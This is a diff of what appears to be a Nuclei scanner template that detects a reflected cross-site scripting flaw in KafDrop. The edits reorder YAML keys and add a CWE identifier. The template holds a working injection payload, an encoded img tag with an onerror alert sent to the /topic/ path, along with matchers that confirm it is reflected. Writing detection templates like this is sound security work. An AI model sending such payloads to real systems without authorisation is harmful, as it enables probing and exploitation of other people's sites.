@@ -1,5 +1,4 @@
 id: kafdrop-xss
-
 info:
   name: KafDrop - Cross-Site Scripting
   author: dhiyaneshDk
@@ -11,26 +10,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-83
   metadata:
     max-request: 1
-  tags: kafdrop,xss,vuln
-
+  tags: kafdrop,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - 'Kafdrop'
-          - '<img src=x onerror=alert(2)>'
+  - matchers:
+      - condition: and
         part: body
-        condition: and
-
-      - type: status
-        status:
+        type: word
+        words:
+          - Kafdrop
+          - <img src=x onerror=alert(2)>
+      - status:
           - 500
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/topic/e''%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E'
